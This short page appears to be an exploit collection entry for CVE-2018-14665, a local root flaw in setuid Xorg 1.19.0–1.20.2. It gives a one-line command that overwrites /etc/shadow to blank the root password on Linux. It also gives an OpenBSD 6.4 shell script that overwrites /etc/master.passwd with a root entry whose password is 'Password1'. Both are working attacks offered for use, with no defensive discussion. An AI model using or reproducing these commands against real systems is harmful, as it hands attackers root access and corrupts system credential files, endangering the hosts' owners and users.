#CVE-2018-14665 - a LPE exploit via http://X.org  fits in a tweet

cd /etc; Xorg -fp "root::16431:0:99999:7:::"  -logfile shadow  :1;su

Overwrite shadow (or any) file on most Linux, get root privileges. *BSD and any other Xorg desktop also affected.





#!/bin/sh
# local privilege escalation in X11 currently
# unpatched in OpenBSD 6.4 stable - exploit
# uses cve-2018-14665 to overwrite files as root. 
# Impacts Xorg 1.19.0 - 1.20.2 which ships setuid
# and vulnerable in default OpenBSD.
#
# - https://hacker.house
echo [+] OpenBSD 6.4-stable local root exploit
cd /etc
Xorg -fp 'root:$2b$08$As7rA9IO2lsfSyb7OkESWueQFzgbDfCXw0JXjjYszKa8Aklt5RTSG:0:0:daemon:0:0:Charlie &:/root:/bin/ksh' -logfile master.passwd :1 &
sleep 5
pkill Xorg
echo [-] dont forget to mv and chmod /etc/master.passwd.old back 
echo [+] type 'Password1' and hit enter for root
su -


EBB Note ~ Another version of it: https://gist.github.com/0x27/d8aae5de44ed385ff2a3d80196907850
            
